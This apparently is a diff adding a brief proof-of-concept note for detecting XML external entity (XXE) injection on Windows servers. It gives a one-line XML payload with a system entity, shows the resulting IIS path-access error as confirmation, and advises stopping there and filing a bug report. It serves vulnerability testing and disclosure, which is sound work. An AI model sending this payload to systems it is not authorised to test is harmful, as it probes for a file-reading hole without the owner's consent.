@@ -1,0 +1,11 @@
+Windows XXE Smoke Test PoC
+
+Application Request Contains:
+<!DOCTYPE x [<!ENTITY y SYSTEM ".">]><x><z>&y;</z></x>
+
+Application Response Contains:
+Access to the path 'c:\windows\system32\inetsrv' is denied.
+
+That means you've successfully confirmed XXE on Windows
+
+Suggestion: Stop and Send in a Bug Report
